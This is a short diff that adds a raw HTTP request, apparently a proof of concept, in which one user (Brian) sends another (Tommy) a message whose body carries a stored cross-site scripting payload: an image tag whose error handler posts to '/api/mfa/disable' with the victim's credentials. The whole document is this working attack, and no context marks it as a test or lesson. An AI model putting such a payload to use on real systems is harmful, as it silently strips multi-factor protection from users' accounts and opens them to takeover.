@@ -1,0 +1,5 @@
+POST /messages/send HTTP/1.1
+Cookie: session=<brian>
+Content-Type: application/x-www-form-urlencoded
+
+recipient=tommy&body=<img src=x onerror="fetch('/api/mfa/disable',{method:'POST',credentials:'include'})">
